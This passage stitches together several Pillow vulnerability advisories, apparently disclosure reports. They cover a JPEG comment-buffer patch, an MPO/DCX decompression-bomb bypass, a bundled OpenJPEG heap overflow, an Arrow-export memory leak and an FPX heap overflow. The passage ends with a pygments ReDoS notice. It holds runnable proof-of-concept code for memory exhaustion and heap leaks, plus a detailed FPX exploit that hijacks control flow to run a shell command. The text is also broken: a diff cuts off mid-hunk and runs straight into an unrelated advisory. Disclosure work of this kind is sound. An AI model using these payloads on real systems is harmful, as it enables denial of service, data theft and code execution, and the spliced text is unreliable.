`encode.c` already UTF-8-encodes `str` via `z#`, so the bytes written are unchanged. A side effect visible to users: comments of up to 65533 bytes now save successfully in cases that previously raised `OSError: broken data stream` because the default buffer was too small. The patch adds `test_icc_big_comment` to `Tests/test_file_jpeg.py`, which round-trips a 65533-byte comment with ICC profiles sized around the exact-fit boundary; it crashes (or raises `OSError`) on the unpatched tree and passes with the patch. With the patch applied to a clean tree and rebuilt, the reproducer no longer triggers, and `Tests/test_file_jpeg.py` and `Tests/test_file_mpo.py` pass.  The C guard still depends on the Python sizing to avoid a 0-byte/no-error busy loop, exactly as state 2 already does. A more defensive variant would fail with `IMAGING_CODEC_MEMORY` instead of `break` when the marker does not fit and nothing has been written to the current buffer yet (`next_output_byte == buf`), so that a sizing mistake in any caller can never turn into a busy loop. It would also be consistent with `exif`/`xmp` handling for `_save()` to reject comments longer than `MAX_BYTES_IN_MARKER` (65533) with `ValueError("Comment is too long")` rather than leaving it to libjpeg's `JERR_BAD_LENGTH` → `OSError`.  Independently, the "+ 1 spare byte" / "+ 5" reasoning in `_save()` under-counts by the 18–20 bytes `jpeg_start_compress()` writes before the EXIF/extra blocks; that is what lets attacker-sized metadata land the buffer on an exact boundary in the first place. The attached patch does not change that accounting.  ## The patch  Check free output-buffer space before writing the JPEG COM marker in ImagingJpegEncode, and size the encoder buffer for the comment in JpegImagePlugin._save  Applies to `src/libImaging/JpegEncode.c` at the commit above.  ```diff diff --git a/Tests/test_file_jpeg.py b/Tests/test_file_jpeg.py index b361aef2e..f884883c4 100644 --- a/Tests/test_file_jpeg.py +++ b/Tests/test_file_jpeg.py @@ -227,6 +227,16 @@ class TestFileJpeg:          im1 = self.roundtrip(hopper(), icc_profile=icc_profile)          assert im1.info.get("icc_profile") == (icc_profile or None)   +    def test_icc_big_comment(self) -> None: +        # The ICC profile may fill the encoder buffer exactly, in which case the +        # comment has to be written to the next buffer +        comment = b"C" * 65533 +        for n in range(ImageFile.MAXBLOCK - 40, ImageFile.MAXBLOCK - 30): +            icc_profile = b"I" * n +            im = self.roundtrip(hopper(), icc_profile=icc_profile, comment=comment) +            assert im.info["icc_profile"] == icc_profile +            assert im.info["comment"] == comment +      def test_large_icc_meta(self, tmp_path: Path) -> None:          # https://github.com/python-pillow/Pillow/issues/148          # Sometimes the meta data on the icc_profile block is bigger than diff --git a/src/PIL/JpegImagePlugin.py b/src/PIL/JpegImagePlugin.py index 4b8d34ca3..1d9f4c2fa 100644 --- a/src/PIL/JpegImagePlugin.py +++ b/src/PIL/JpegImagePlugin.py @@ -805,7 +805,9 @@ def _save(im: Image.Image, fp: IO[bytes], filename: str | bytes) -> None:              )              i += 1   - ### Summary Pillow's decompression-bomb protection (`Image._decompression_bomb_check`, gated by `Image.MAX_IMAGE_PIXELS`) is enforced only on the **first frame**, inside `Image.open()`. For multi-frame formats, `seek()` re-parses the target frame's header and resets `self._size`. `GifImagePlugin` and `TiffImagePlugin` re-run the bomb check on `seek()`, but **`MpoImageFile.seek()` and `DcxImageFile.seek()` do not.** A crafted MPO or DCX whose first frame is tiny (passing the check) but whose later frame declares enormous dimensions therefore bypasses the protection: loading that frame decodes an over-limit image and commits large amounts of memory — a denial of service (memory exhaustion / OOM).  Same class as the recently assigned CVE-2026-55379 (BdfFontFile), CVE-2026-55380 (GdImageFile) and CVE-2026-40192 (FITS GZIP).  ### Details `Image.open()` → `_open_core()` runs `_decompression_bomb_check(im.size)` once, on the frame present at open time. Both vulnerable `seek()` methods re-parse a new frame and set a new `self._size` without re-checking:  - **`PIL/MpoImagePlugin.py`, `MpoImageFile.seek()`**: calls `JpegImagePlugin.JpegImageFile._open(self)` (which sets `self._size` from the frame's JPEG SOF) and rebuilds `self.tile`, with no `Image._decompression_bomb_check(self.size)`. - **`PIL/DcxImagePlugin.py`, `DcxImageFile.seek()`**: calls `PcxImageFile._open(self)` (which sets `self._size` from the page's PCX header), with no check.  Confirmed present in **12.3.0** (latest release) and on **`main`** (13.0.0.dev0). Compare `GifImagePlugin._seek` and `TiffImagePlugin`, which call `_decompression_bomb_check` correctly on seek.  ### PoC Self-contained; the victim uses **default** `MAX_IMAGE_PIXELS`:  ```python import io from PIL import Image  # attacker builds the file (guard disabled only to CREATE the oversized frame) Image.MAX_IMAGE_PIXELS = None small = Image.new("RGB", (8, 8)) big   = Image.new("RGB", (14000, 14000), (120, 60, 30))   # 196,000,000 px > error threshold buf = io.BytesIO() small.save(buf, format="MPO", save_all=True, append_images=[big]) data = buf.getvalue()                                      # ~3 MB Image.MAX_IMAGE_PIXELS = int(1024 * 1024 * 1024 // 4 // 3) # restore default  # victim (default limits) im = Image.open(io.BytesIO(data))   # frame 0 (8x8) passes the bomb check im.seek(1)                          # frame 1 (14000x14000) -> NOT re-checked  <-- bug im.load()                           # decodes the over-limit image, commits memory print("loaded over-limit frame:", im.size) ```  Measured on Pillow 12.3.0 (default limit 89,478,485 px; error threshold 178,956,970 px):  | Vector | File size | Frame 1 | Peak RSS | |---|---|---|---| | MPO (JPEG) | ~3.0 MB | 14000×14000 (196 Mpx) | ~763 MB | | DCX (PCX) | ~6.2 MB | 14000×14000 (196 Mpx) | ~200 MB | | Control: same image standalone | — | 196 Mpx | `DecompressionBombError` (correctly blocked) |  The DCX vector (`0x3ADE68B1` magic + offset directory + two PCX pages) behaves identically via `DcxImageFile.seek()`. Scaling frame 1 toward JPEG's ~65500×65500 maximum drives multi-GB commitments from a small file, reliably OOM-killing the process.  ### Impact Denial of service (memory exhaustion / OOM) — CWE-400 / CWE-1284, a bypass of Pillow's documented decompression-bomb mitigation. `seek()` + `load()` is the normal way to iterate frames (e.g. `PIL.ImageSequence.Iterator`, thumbnailers, converters, 3D-photo handlers). Because **MPO is auto-detected from a JPEG carrying MPF metadata**, a file served with a `.jpg` extension can be opened as MPO, so any application that iterates frames of untrusted images is exposed.  ### Suggested fix Re-run the check after `seek()` re-parses a frame, mirroring GIF/TIFF:  ```python # PIL/MpoImagePlugin.py — end of MpoImageFile.seek() self.tile = [ImageFile._Tile("jpeg", (0, 0) + self.size, self.offset, self.tile[0][-1])] Image._decompression_bomb_check(self.size)   # add self.__frame = frame  # PIL/DcxImagePlugin.py — end of DcxImageFile.seek() PcxImageFile._open(self) Image._decompression_bomb_check(self.size)   # add ```

### Summary  Every Pillow wheel from 11.1.0 onward bundles a libopenjp2 containing a heap-buffer-overflow **write** that is fixed upstream on master but has never appeared in an OpenJPEG release. See https://osv.dev/vulnerability/OSV-2025-219  Because the wheel bundles its own copy, a patched host OS does not help. It is reachable from `Image.open(fp); im.load()` with default settings.  I am reporting it here rather than only upstream because Pillow is where the vulnerable binary actually reaches users.  Note the inversion that makes this easy to miss: **OpenJPEG 2.5.2 and earlier are safe.** The bug was introduced in `954c6e3c` (2024-06-25), so keeping the dependency current is what creates the exposure.  ### Details  ## Affected wheels  From `.github/dependencies.json` (`openjpeg`) at each tag:  | Pillow | bundled OpenJPEG | status | |---|---|---| | 10.4.0 | 2.5.2 | safe | | 11.0.0 | 2.5.2 | safe | | **11.1.0, 11.2.1, 11.3.0** | **2.5.3** | **affected** | | **12.0.0 … 12.3.0** | **2.5.4** | **affected** |  Confirmed on an installed wheel: `PIL.features.version_codec('jpg_2000')` → `2.5.4`, bundled file `pillow.libs/libopenjp2-*.so.2.5.4`. `main` still pins `2.5.4` as of 2026-10-06.  ## The defect  `src/lib/openjp2/j2k.c`, in `opj_j2k_read_sod`:  ```c OPJ_UINT32 l_current_tile_part =     l_cstr_index->tile_index[p_j2k->m_current_tile_number].current_tpsno; l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_header = l_current_pos; l_cstr_index->tile_index[...].tp_index[l_current_tile_part].end_pos   =     l_current_pos + p_j2k->m_specific_param.m_decoder.m_sot_length + 2; ```  `tp_index` is neither null-checked nor bounds-checked, and `l_current_tile_part` comes directly from the one-byte `TPsot` field of the SOT marker.  The correct guard already exists a few lines later in `opj_j2k_add_tlmarker` (j2k.c:8459), writing the **same array at the same index** behind `if (tp_index && l_current_tile_part < nb_tps)`. One writer checked, its sibling not.  Reached by giving the codestream a *valid* TLM marker — so `tp_index` is allocated once by `opj_j2k_build_tp_index_from_tlm`, sized to the TLM entry count, and `opj_j2k_read_sot` then skips all resizing — while setting `TNsot = 0` in every SOT, which keeps the TLM "valid" and lets `TPsot` walk past the allocation.  ## Patch status  Fixed upstream in `91d08b11` ("Fix heap buffer overlfow in opj_j2k_read_sod", 2026-02-10).  The newest OpenJPEG tag is **v2.5.4 (2025-09-20)**, and `compare/v2.5.4...91d08b11` reports *ahead 6, behind 0* — the fix is **in no release, 8 months on**.  ## Suggested remediation  1. Carry `91d08b11` as a patch in the wheel build until an OpenJPEG release includes it — three lines, identical to a guard already present in the same file. 2. Consider asking OpenJPEG to cut a release; they have had an unreleased memory-corruption fix on master since February 2026, and every distro is shipping the vulnerable code. 3. Your security handbook already tells applications to block EPS at the application layer. A similarly explicit note that `Image.open()` ignores filename/Content-Type and will reach any compiled-in codec unless `formats=` is passed would help downstream apps a lot.  ## Not a Pillow bug, but relevant: the extension allowlist most apps rely on does not apply  `Image.open()` sniffs magic bytes, so a JPEG 2000 codestream in a file named `avatar.png` declared `Content-Type: image/png` reaches the JP2 decoder anyway.  I verified this against a production service documenting PNG/JPEG-only uploads: it accepted and fully decoded a JP2 through exactly that path, with 16 formats reachable from one upload endpoint against 43 registered openers. That service has since fixed it by passing `formats=` and validating on the detected format rather than the client's `Content-Type`.  That is the reason a decoder-level issue like this one has much wider reach than downstream maintainers tend to assume.  ### Proof of concept  ASan build of OpenJPEG 2.5.4 interposed under a **stock Pillow 12.3.0**, running `Image.open(p); im.load()`:  ``` ==766332==ERROR: AddressSanitizer: heap-buffer-overflow WRITE of size 8     #0 opj_j2k_read_sod          j2k.c:5086     #1 opj_j2k_read_tile_header  j2k.c:9912     #2 opj_read_tile_header      openjpeg.c:575     #3 j2k_decode_entry          src/libImaging/Jpeg2KDecode.c:793     #4 ImagingJpeg2KDecode       src/libImaging/Jpeg2KDecode.c:949     #5 _decode                   src/decode.c:132 located 8 bytes to the right of a 24-byte region allocated by     opj_j2k_build_tp_index_from_tlm j2k.c:8939 ```  Frames 3–5 are Pillow's own decoder, not a synthetic harness. No non-default decoder options are involved; strict mode is on, which is Pillow's behaviour since Pillow never calls `opj_decoder_set_strict_mode`. A benign twin image runs the same path cleanly and returns a valid image, so this is the payload and not a parse failure.  I have deliberately **not** attached the PoC file to this initial report. I'm happy to attach the PoC, the builder script and the RIP-control harness here on request, or hold everything until a fix is ready.  No disclosure deadline from me; I will not publish anything while this is being worked on.  ### Impact  Any application that calls `Image.open()` / `im.load()` on an image it did not produce — the overwhelmingly common case for upload handlers, thumbnailers and preview pipelines — can be made to perform an out-of-bounds heap write by supplying one crafted file.  **Floor, already certain.** On a stock non-sanitised wheel the overflow performs 245 writes walking to +5856 bytes past a 24-byte allocation, and glibc's own heap-metadata checker aborts the process (`corrupted size vs. prev_size`, `corrupted double-linked list`, SIGABRT). One file reliably kills a long-lived worker.  **Ceiling, demonstrated as a primitive but not as a finished exploit.** With same-size-class objects alive on both sides — an ordinary busy heap — the walk crosses `opj_event_mgr_t`, which holds three `opj_msg_callback` function pointers, and `opj_event_msg` then calls one (event.c:136):  ``` rip  0x4000    <- value chosen by the attacker's file layout rsi  0x3ff2    <- m_error_data, written by the same walk ```  Shifting the codestream with a COM marker moves `rip` with it (`0x16ce` → `0x4000`), so the instruction pointer is attacker-**chosen** rather than incidentally invalid. A benign control image leaves the same groomed heap untouched.  To be explicit about what I did not do: I have **not** built a working exploit. That additionally needs remote heap grooming and an ASLR defeat, and I attempted neither. I am reporting a controlled control-flow primitive, not a finished chain. The CVSS AC:H reflects that.

### Summary  When [`PILLOW_ALIGNMENT`](https://pillow.readthedocs.io/en/stable/reference/block_allocator.html#memory-pools) is set above 1, exporting an image to Arrow returns uninitialized heap memory mixed in with the pixel data. That memory can include pixels from images the process freed earlier.   ### Details  With an alignment above 1, the default allocator pads each row up to `aligned_linesize` and starts the first row at an aligned offset into the block. It then exports `im->blocks[0].ptr` as `xsize * ysize` tightly packed pixels, so exported data includes the padding bytes, and can include a few bytes from before the first row.  Tested vulnerable on 11.2.1, 12.3.0, 4c1ed27a5.  ### PoC  Whether things leak may depend on allocator configuration. This does show a leak on my Mac.  ```python import os  os.environ["PILLOW_ALIGNMENT"] = "64"  from PIL import Image  # Image A: 64 px wide, so its rows fill the whole aligned stride a = Image.new("L", (64, 40), 0x41).transpose(Image.Transpose.FLIP_LEFT_RIGHT) del a  # Image B: 61 px wide, so each row has 3 bytes of padding; its pixels are all 0 b = Image.new("L", (61, 40), 0).transpose(Image.Transpose.FLIP_LEFT_RIGHT)  try:     exported = Image.fromarrow(b, b.mode, b.size).tobytes() except ValueError as e:     print("Not vulnerable:", e) else:     if leaked := len(exported) - exported.count(0):         raise RuntimeError(f"{leaked} of {len(exported)} exported bytes are not B's pixels") ```  ### Impact  Information disclosure for applications that set `PILLOW_ALIGNMENT` and export images to Arrow. Likely any image whose row length isn't a multiple of the alignment will do. In a service handling several users' images, one user's exported data can contain pixels from another user's image, or other stale heap contents.

### Credits  **Researcher**: Alex Bouffard (mixbo@pebwalker.com)  ### Summary  A heap buffer overflow in Pillow's FlashPix (FPX) JPEG-tile decoder lets an attacker achieve arbitrary code execution by getting an application to open a single crafted file with `Image.open()`. The file is recognized by content (the OLE2 magic), not by extension, so any service that opens or thumbnails untrusted uploads with the optional `olefile` dependency installed is reachable with no user interaction. In the PoC below, opening one crafted file executes an attacker-chosen command on stock Pillow 12.2.0 (x86_64 Ubuntu 24.04, glibc 2.39).  ### Details  `FpxImagePlugin` decodes FlashPix (FPX) files, which are OLE2/CFBF compound documents.  `Image.open()` auto-detects them from the OLE2 magic `D0CF11E0...` whenever the optional `olefile` package is installed (Pillow's documented dependency for FPX/MIC support), regardless of the file's extension.  For a JPEG-compressed subimage (`compression == 2`), the plugin builds a `"jpeg"` decode tile and derives the `(rawmode, jpegmode)` pair from attacker-controlled FPX color IDs through the `MODES` table ([`src/PIL/FpxImagePlugin.py` L25-L32](https://github.com/python-pillow/Pillow/blob/12.2.0/src/PIL/FpxImagePlugin.py#L25-L32)):  ```python MODES = {     ...     (0x00018000, 0x00017FFE): ("RGBA", "LA"),                # rawmode "LA"  (2 bytes/pixel)     ...     (0x00020000, 0x00020001, 0x00020002): ("RGB", "YCC;P"),  # rawmode "YCC;P" } ```  The Imaging output buffer for the tile is sized for the rawmode (here `"LA"` = 2 bytes/pixel) ([`src/decode.c` L223-L226](https://github.com/python-pillow/Pillow/blob/12.2.0/src/decode.c#L223-L226)):  ```c state->bytes = (state->bits * state->xsize + 7) / 8;   // "LA" gives 2 * xsize bytes/row ... state->buffer = (UINT8 *)calloc(1, state->bytes); ```  In `JpegDecode.c` the rawmode string is mapped to a libjpeg `out_color_space`. Recognized modes (`CMYK`, `YCbCr`, `YCbCrK`, and so on) get a concrete colorspace, but `"LA"` and `"YCC;P"` are not recognized, so control reaches the fallback branch ([`src/libImaging/JpegDecode.c` L219-L221](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L219-L221)):  ```c /* Disable decoder conversions. */ context->cinfo.jpeg_color_space = JCS_UNKNOWN; context->cinfo.out_color_space  = JCS_UNKNOWN; ```  Under `JCS_UNKNOWN`, libjpeg performs no color conversion and emits `cinfo.num_components` bytes per pixel, taken from the embedded JPEG's SOF marker, which the attacker sets to 4. So `jpeg_read_scanlines` writes `4 * width` bytes per row into a buffer allocated for only `2 * width` bytes ([`src/libImaging/JpegDecode.c` L252](https://github.com/python-pillow/Pillow/blob/12.2.0/src/libImaging/JpegDecode.c#L252)):  ```c ok = jpeg_read_scanlines(&context->cinfo, &state->buffer, 1);   // writes 4*W into a 2*W buffer ```  This is a heap out-of-bounds write with attacker-controlled length (the image width, up to tens of thousands of pixels, so about `2 * width` bytes of overflow per row) and attacker-controlled content (the decoded pixel data). The PoC weaponizes it: the overflow overwrites an adjacent Python `bytes` object's `ob_type` with a pointer to a fake `PyTypeObject` / `PyBufferProcs` vtable that the same overflow plants inside the decode buffer. When Pillow releases the input buffer, `PyBuffer_Release` walks `ob_type -> tp_as_buffer -> bf_releasebuffer` and executes `call *rax`; the PoC points that at `system@plt` (fixed, the interpreter binary is non-PIE) with `rdi` set to the command string, yielding command execution.  ### PoC  To facilitate an exact reproduction on an x86_64 machine, this PoC uses the version-pinned, ASLR-disabled Docker image from [Annex A](#annex-a-docker-setup).  The source code for the payload builder `make_payload.py` is in [Annex B](#annex-b-payload-builder-source).  `vulnerable.py` is the program under test, a one-liner that opens the file it is given:  ```python #!/usr/bin/env python3 # The entire vulnerable operation an application performs on an untrusted file. import sys from PIL import Image  Image.open(sys.argv[1]).load() ```  The payload is a standalone `.fpx` file the attacker crafts on their own host; the target only ever opens the resulting file, so building it requires no access to or code execution on the target. We run `make_payload.py` inside the same container here purely for convenience, so its baked-in addresses (`--offset`, `system@plt`) match this pinned image. The payload redirects the hijacked indirect call to `system@plt` (`0x4206c0`, fixed because the interpreter binary is non-PIE) with a baked-in command:  ```console $ python3 make_payload.py --target 0x4206c0 --cmd id --out shell.fpx [control] shell.fpx: S=0xdc8800 target=0x4206c0 cmd='id' craft_iters=0 bad=0 [control] opening it: vtable hijack -> call *0x4206c0 with rdi -> 'id' ```  Then open it with `vulnerable.py`:  ```console $ python3 vulnerable.py shell.fpx uid=0(root) gid=0(root) groups=0(root) corrupted size vs. prev_size ```  `Image.open()` of the crafted file runs the baked command via `system("id")`: command execution as the user running the image processing (root in the container).  The trailing `corrupted size vs. prev_size` is glibc aborting during interpreter teardown over the corrupted heap, after `id` has already run.  The builder writes the command inline at the hijacked `rdi`, so `--cmd` is limited to 7 bytes (for example `id`, `id;w`). `--offset` and `system@plt` are constants of the pinned, ASLR-disabled image and hold across runs of it.  ### Impact  This is a heap-based buffer overflow (CWE-122) / out-of-bounds write (CWE-787) that leads to code execution. Any application or service that opens attacker-influenced files with Pillow and has the optional `olefile` dependency installed is affected: image upload and thumbnailing services, avatar and media processing, document and image conversion pipelines, and similar. Because detection is by OLE2 magic rather than file extension and the overflow is triggered during a normal `Image.open()` / `load`, a server that automatically processes an uploaded file is exploitable with no user interaction. The result is arbitrary command execution in the context of the process performing the image processing, leading to full compromise of that process and the data and privileges it holds.  ### Annex A: Docker setup  The PoC runs in a pinned Docker image so the environment is deterministic; the image installs a version-pinned Python (3.12.3) and the Pillow 12.2.0 wheel, and the builder is pure Pillow. The image's entrypoint disables ASLR (`setarch -R`) to reduce the system knowledge requirements. The single `--security-opt seccomp=unconfined` flag on `docker run` is required only because turning ASLR off uses the `personality()` syscall that Docker's default seccomp profile blocks. Run only on infrastructure you own.  **1. A security flaw has been discovered in pygments before 2.20.0. The impacted element is the function AdlLexer of the file pygments/lexers/archetype.py. The manipulation results in inefficient regular expression complexity. The attack is only possible with local access. The exploit has been released to the public and may be used for attacks. The project was informed of the problem early through an issue report but has not responded yet.
